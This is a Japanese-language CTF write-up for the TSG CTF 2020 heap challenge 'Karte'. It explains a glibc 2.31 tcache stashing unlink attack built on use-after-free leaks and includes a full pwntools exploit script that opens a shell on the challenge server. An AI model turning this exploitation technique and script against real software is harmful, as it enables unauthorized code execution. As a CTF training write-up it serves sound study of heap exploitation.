---
tags: pwn
---

# TSG CTF 2020 - Karte

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

部分的なshow機能とより部分的なedit機能があるHeap問題、普通のHeap問題と違うのはmallocではなくreallocを使うことと、bssセクションにある変数に0でない値を入れて特定メニューを選択するとシェルが起動することである
free後にポインタを破棄しないため、UAFがあるが、チャンク指定がインデックスでは無く、bk, keyの位置に対応するidで行われるのでtcacheでこれをするにはまず、Heap leakをしなくてはならない。そのためにfastbinを利用してHeap leakをする
今回は任意の値の書き込みが実質bkにしか出来ないのでsmallbinの末端チャンクのbkを書き換えてから目標のアドレスをsmallbinに繋ぐ
次にsmallbinからmallocされる時にtcacheにチャンク群が入るのだが、この時のunlinkでチェックをすり抜けた上に良い感じに目標アドレスに値が入ってくれるのでここでシェル起動メニューを選択すればシェルが起動する

### checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
このレベルのCTFでPIE無効だと逆に不穏さを感じる(実際生半可な問題では無かった)

### Binary

* libc: 2.31
* 保持可能ポインタ: 32
* malloc可能サイズ: 0x50以上, 0xa1未満
* コマンド
    * allocate: サイズを指定してチャンクを確保、この際以後の識別用にidを指定する
    * extend: idを指定してrealloc、サイズの変更が出来るが小さくすることは出来ない
    * change_id: 指定したidのチャンクのidを変更する、任意書き込みが出来るのはここのみ
    * show: sizeとidを表示する
    * deallocate: idを指定してfree
    * (隠し): `authorized`変数が0でなければシェルを起動する

allocate時には次のような構造体が作られる

```c
struct karte {
    unsigned long long size;
    unsigned long long id;
    ...
};
```

sizeは実際のチャンクサイズではなく、ユーザーがコマンドで指定した値である。

### 準備

.bssセクションの構造だが次のようになっている

```
name        | 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
name + 0x10 | 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
authorized  | 00 00 00 00 00 00 00 00 | 00 00 00 00 00 00 00 00
```

今回は`name + 0x10`の部分をsmallbinにまず繋ぐ、ここで名前入力時にnameにbkを偽装したチャンクを作る
`name + 0x18`が`name + 0x10`をチャンクとみなした際のbkになるのでここに`authorized - 0x10`を入れておくとsmallbinは`(smallbin top ->) ... -> name + 0x10 -> authorized`のようになってくれる
ここで下記に示すtcache stashing unlink attackを行うことで`name + 0x10`までのチャンクがtcacheに入るようにする。その際のunlinkでauthorizedのfdにはmain_arenaの`bins[size]`に対応するアドレスが入ってくれる

### realloc

指定したチャンクのサイズを変更する関数で、この問題では何故かこいつが使われている
今回は(殆どの場合)出来ないが、サイズを小さくする際はチャンクを分割し、サイズヘッダを書き換える(分割されたチャンクのサイズが0x20を下回る場合は別の処理が走る)
大きくする場合は下が空いている場合はそこから削り出し、空いていない場合は該当チャンクをfreeしてから別のチャンクを取ってきてポインタを返す。よって部分的にfreeもmallocも出来る

### Heap Leak

まずはheap leakをする。free時にポインタは破棄されずUAFがあるので簡単に出来るかと思いきや、tcacheはkeyメンバによってidを潰してしまうのでheap leakをするためにheap leakが必要になってしまう
そこでfastbinを使う。tcacheを全部埋めてからfreeしてfastbinに送ればidは生きているのでshowでsizeに相当する部分でfdが開示されHeap leakが出来る

### smallbinからtcacheに移される仕様

smallbinからチャンクを取得する際に、tcacheに空きがあるならbkを順に辿っていくことでtcacheに格納される。
この時smallbinがFIFOなのに対してtcacheがLIFOなのでsmallbinに入っていた時とは逆の順番で格納される
なお、この際にsmallbinからunlinkされるのだが、通常のunlinkとは異なり、`victim->bk->fd == victim`のチェックが走らない。よってsmallbin中のあるチャンクのbkを変な値にしたところで怒られは発生しない(但し、実際はELFが関与できないアドレスで怒られが発生するのでそういう意味で問題無いアドレスにしておく必要がある)

### tcache stashing unlink attack

このチェックの無さを悪用すればtcacheに任意アドレスを繋ぐことが出来る。具体的にはsmallbin中のbkの値を書き換える。
但し、tcacheへの格納終了条件が

1. tcacheが満杯になる
2. smallbinが空になる(リンクリストが一周して`bin->bk == bin`になる)

であり、bkを書き換えると2. の条件を満たすことは無い。よってタイミング良くtcacheが満杯になるタイミングで`name + 0x10`をtcacheに繋ぐ必要がある。この際のunlinkで良い感じに`authorized`に値が入ってくれる

### keyの改竄

上記の攻撃を実現するには`change_id`コマンドを実行する。このためには該当するチャンクのidを知る必要があるが、smallbinの末端のチャンクが対象であるので対応するbinのアドレスが必要である(main_arenaの`bins[size]`)。
binの先頭にあるチャンクのfdにはbinのアドレスがあるのでここを読みたいのだが、それにもIDが必要になる。そこでleakしたHeapのアドレスが使われる
binの先頭にあるチャンクのbkは次に確保されるチャンクであるのでHeap leakが済んでいればそれを利用してidの特定が出来る。これでmain_arena中の`bins[size]`のアドレスをリークし、change_idで末端のチャンクのbkをauthorizedがsmallbin中で次に確保されるように書き換える、具体的にはnameの位置を指定する。
すると事前に`name`を上手く構成しておいたのでsmallbinは`(smallbin top ->) A -> B -> C -> D -> E -> F -> name + 0x10 -> authorized`のようになる。
これで上記のstashing unlinkが行われた時に`name + 0x10`までがtcacheに入り、`authorized`のfdに`bins[size]`のアドレスが入る

### まとめ

どのidをどうやって入手するのかがやや複雑

1. 名前を入力する(tcache stashing unlink attackの際に発生するunlinkで上手くauthorizedに値が入るようにbkを偽装したチャンクを作っておく)
2. tcacheを埋めてfastbinに2つ以上チャンク送り、nextを読んでheap leakする
3. fastbinに入らないサイズでtcacheを埋めてからunsorted binに7つチャンクを送り、そこが取られないようなmallocを発動させてsmallbinに送る
4. smallbinの先頭のチャンクを利用してbinのアドレスをリークし、それをIDとしている末端のチャンクのbkを`change_id`で書き換える
5. tcacheを空にし、更にもう一度mallocを発生させることで後続のチャンク群がsmallbinからtcacheに移される
6. この際のunlinkでauthorizedに数字が入ってくれるのでシェル起動コマンドを叩けばシェルが起動する

## Code

```python
from pwn import p64, u64, process, ELF, remote


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(str(sel))


def alloc(s, id, size):
    select(s, 0)
    s.recvuntil(b"id > ")
    s.sendline(str(id))
    s.recvuntil(b"size > ")
    s.sendline(str(size))


def extend(s, id, size):
    select(s, 1)
    s.recvuntil(b"id > ")
    s.sendline(str(id))
    s.recvuntil(b"size > ")
    s.sendline(str(size))


def change_id(s, id, new_id):
    select(s, 2)
    s.recvuntil(b"id > ")
    s.sendline(str(id))
    s.recvuntil(b"new id > ")
    s.sendline(str(new_id))


def show(s, id):
    select(s, 3)
    s.recvuntil(b"id > ")
    s.sendline(str(id))
    s.recvuntil(b"id: ")
    res = tuple(map(lambda x: int(x, 16), s.recvline().rstrip().split(b" size: ")))
    ret = {
        "id": res[0],
        "size": res[1]
    }

    return ret


def deallocate(s, id):
    select(s, 4)
    s.recvuntil(b"id > ")
    s.sendline(str(id))


if __name__ == "__main__":
    # s = process("./karte")
    s = remote("35.221.81.216", 30005)
    elf = ELF("./karte")
    name_addr = elf.symbols["name"]
    auth_addr = elf.symbols["authorized"]
    libc = ELF("./libc.so.6")
    s.recvuntil(b"> ")
    name = p64(0) * 3 + p64(name_addr + 0x10)
    s.sendline(name[:0x1e])

    # heap leak from fastbin
    for i in range(9):
        alloc(s, i + 100, 0x78)

    for i in range(9):
        deallocate(s, i + 100)

    heap_base = show(s, 108)["size"] - 0x610
    tps = heap_base + 0x10
    print(hex(heap_base))

    for i in range(14):
        alloc(s, 1000 + i, 0x88)

    # fill tcache
    for i in range(13, 0, -2):
        deallocate(s, i + 1000)

    # to unsorted bin
    for i in range(12, -1, -2):
        deallocate(s, i + 1000)

    # to smallbin
    alloc(s, 10000, 0x98)

    key = heap_base + 0xcb0
    libc_key = show(s, key)["size"]
    print(hex(libc_key))

    # ready for stashing unlink attack
    change_id(s, libc_key, name_addr)

    # empty tcache
    for i in range(7):
        alloc(s, 10 + i, 0x88)

    # tcache stashing unlink attack
    alloc(s, 21, 0x88)

    select(s, 5)

    s.interactive()

```

## Flag

当日は別のチームメイトが提出しましたが鯖が生きていたのでやりました
`TSGCTF{Realloc_is_all_you_need~}`

(フラグ見て思い出したけどそういえばextend使って無い...)

## 感想

[TSG CTF 2020 - Detective](/iXn-7uXHRqevwjxwFRa-IQ)もそうでしたが普通のHeap問題にありがちなhookにシェル起動アドレスを放り込むといった問題が少なくて典型問題に慣れているだけでは解けない良問が揃っていました
今回は特にインデックスではなくidで対象のチャンクを選ぶというシステムだったのでfree後に各binに入った際にfd, bk(tcacheの場合はnext, key)がどうなるかを把握している必要があり、良い復習になりました
tcache stashing unlink attackのようなtcacheを優先して使わせるという仕様を利用した問題もこれが初めてで非常に面白かったです。

(追記)
tcache stashing unlink attackの解説書きました: [tcache stashing unlink attack](/@Xornet/H1sYvQJlv)

## 参考文献

* <https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_stashing_unlink_attack.c>: CTF開始4時間前に読んでいたのを思い出してチームメイトに提供したら実装してくれた
* <https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3639>: smallbinの挙動、本当はここに書いてあることを超丁寧にまとめようと思ったが1つのWriteupを書く時点で面倒だったのでやめた、気が向いたら別件でやります